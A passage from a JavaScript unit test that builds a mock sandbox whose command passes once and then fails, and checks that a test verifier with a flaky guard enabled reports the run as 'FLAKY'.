      id: 'mock_flaky_box',
      language: 'python',
      async executeCommand() {
        executionCount++;
        // First run passes, second run fails (flaky test behavior)
        if (executionCount === 1) {
          return { exitCode: 0, stdout: '=== 3 passed ===', stderr: '', durationMs: 10 };
        } else {
          return { exitCode: 1, stdout: 'FAILED test_flaky_socket', stderr: '', durationMs: 10 };
        }
      },
      async streamCommand(cmd, onStdout) {
        executionCount++;
        onStdout('=== 3 passed ===');
        return { exitCode: 0, stdout: '=== 3 passed ===', stderr: '', durationMs: 10 };
      },
      async uploadFile() {},
      async readFile() { return ''; },
      async destroy() {},
    };

    const report = await verifier.verify({
      sessionId: 'sess_flaky_06',
      threadId: 'thread_flaky_06',
      sandbox: mockSandbox,
      testCommand: 'pytest',
      attemptNumber: 1,
      enableFlakyGuard: true,
      maxFlakyReruns: 2,
    });

    expect(report.overallStatus).toBe('FLAKY');
    expect(report.flakyTestDetails.detected).toBeTruthy();
  });
});
